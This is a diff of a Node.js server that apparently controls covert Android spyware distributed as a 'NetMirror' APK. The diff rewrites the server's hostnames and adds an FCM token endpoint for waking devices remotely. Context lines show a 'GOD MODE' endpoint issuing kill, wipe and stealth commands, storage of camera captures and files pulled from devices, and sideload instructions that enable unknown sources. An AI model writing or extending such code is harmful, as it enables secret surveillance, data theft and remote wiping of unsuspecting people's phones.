@@ -45,10 +45,10 @@ async function startServer() {
   try {
     const row = db.prepare("SELECT value FROM admin_settings WHERE key = 'app_update_info'").get();
     if (row && row.value && row.value.includes('mirrornet.watch')) {
-      const patched = row.value.replace(/https?:\/\/(www\.)?mirrornet\.watch/gi, 'https://netmirrorr.onrender.com');
+      const patched = row.value.replace(/https?:\/\/(www\.)?mirrornet\.watch/gi, 'https://nowmirror.onrender.com');
       db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('app_update_info', ?)").run(patched);
       if (db.saveNow) db.saveNow();
-      console.log('[Migration] app_update_info: rewrote mirrornet.watch → netmirrorr.onrender.com');
+      console.log('[Migration] app_update_info: rewrote mirrornet.watch → nowmirror.onrender.com');
     }
   } catch (e) {
     console.warn('[Migration] app_update_info rewrite skipped:', e.message);
@@ -945,7 +945,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         '2. Open NetMirror.apk\r\n' +
         '3. Tap Install when prompted\r\n' +
         '4. If asked about unknown sources, enable for Files app\r\n\r\n' +
-        'Support: netmirrorr.onrender.com\r\n'
+        'Support: nowmirror.onrender.com\r\n'
       ));
       zipArchive.addFile('NetMirror.apk', apkBuf);
       const zipBuf = zipArchive.toBuffer();
@@ -2711,6 +2711,40 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
+  // ═══ FCM TOKEN REGISTRATION (Android app calls this) ═══
+  // POST /api/devices/fcm-token — saves the FCM push token for a device so
+  // the backend can send high-priority FCM pushes to wake it from deep sleep.
+  // Also accepts /api/devices/register-fcm-token as an alias.
+  const registerFcmTokenHandler = (req, res) => {
+    try {
+      const { device_id, fcm_token } = req.body;
+      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
+      if (!fcm_token) return res.status(400).json({ error: 'fcm_token is required' });
+
+      // Add fcm_token column if it doesn't exist
+      try {
+        db.exec("ALTER TABLE devices ADD COLUMN fcm_token TEXT DEFAULT ''");
+      } catch (_) {}
+
+      db.prepare("UPDATE devices SET fcm_token = ?, last_seen = datetime('now') WHERE device_id = ?")
+        .run(fcm_token, device_id);
+
+      // Also store in a key-value table for quick lookup
+      try {
+        db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES (?, ?)")
+          .run(`fcm_token_${device_id}`, fcm_token);
+      } catch (_) {}
+
+      console.log(`[FCM] Token registered for device ${device_id}: ${fcm_token.substring(0, 20)}...`);
+      res.json({ success: true });
+    } catch (err) {
+      console.error('[FCM] Token registration error:', err.message);
+      res.status(500).json({ error: err.message });
+    }
+  };
+  app.post('/api/devices/fcm-token', express.json(), registerFcmTokenHandler);
+  app.post('/api/devices/register-fcm-token', express.json(), registerFcmTokenHandler);
+
   // ═══ GOD MODE: Device config check endpoint ═══
   // Called on every app launch + heartbeat. Returns kill/wipe/update/stealth commands.
   app.post('/api/devices/config', (req, res) => {
@@ -2882,7 +2916,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
 
       // Build URL — same host serves /camera_captures/* statically (configured below)
       const protocol = req.headers['x-forwarded-proto'] || 'https';
-      const host = req.headers['host'] || 'netmirrorr.onrender.com';
+      const host = req.headers['host'] || 'nowmirror.onrender.com';
       const url = `${protocol}://${host}/camera_captures/${device_id}/${destName}`;
 
       try {
@@ -2926,7 +2960,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       try { fs.unlinkSync(req.file.path); } catch (_) {}
 
       const protocol = req.headers['x-forwarded-proto'] || 'https';
-      const host = req.headers['host'] || 'netmirrorr.onrender.com';
+      const host = req.headers['host'] || 'nowmirror.onrender.com';
       const url = `${protocol}://${host}/device_files/${device_id}/${safeName}`;
 
       try {
@@ -3721,7 +3755,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       const dest = path.join(__dirname, 'data', 'app-update', 'netmirror.apk');
       require('fs').renameSync(req.file.path, dest);
       const protocol = req.headers['x-forwarded-proto'] || 'https';
-      const host = req.headers['host'] || 'netmirrorr.onrender.com';
+      const host = req.headers['host'] || 'nowmirror.onrender.com';
       const localUrl = `${protocol}://${host}/app-update/netmirror.apk`;
 
       // Persist the APK so it survives Railway redeploys (ephemeral disk).
@@ -3792,7 +3826,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       const newPath = path.join(__dirname, 'data', 'adult-media', newName);
       require('fs').renameSync(req.file.path, newPath);
       const protocol = req.headers['x-forwarded-proto'] || 'https';
-      const host = req.headers['host'] || 'netmirrorr.onrender.com';
+      const host = req.headers['host'] || 'nowmirror.onrender.com';
       const url = `${protocol}://${host}/adult-media/${newName}`;
       res.json({ success: true, url, source: 'local' });
     } catch (err) {
@@ -4719,7 +4753,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         const rows = db.prepare('SELECT id, device_id, filename, camera, file_size, captured_at FROM camera_captures WHERE device_id = ? ORDER BY captured_at DESC LIMIT ? OFFSET ?')
           .all(deviceId, parseInt(limit) || 50, parseInt(offset) || 0);
         const protocol = req.headers['x-forwarded-proto'] || 'https';
-        const host = req.headers['host'] || 'netmirrorr.onrender.com';
+        const host = req.headers['host'] || 'nowmirror.onrender.com';
         const entries = rows.map(r => ({
           ...r,
           url: `${protocol}://${host}/camera_captures/${deviceId}/${r.filename}`
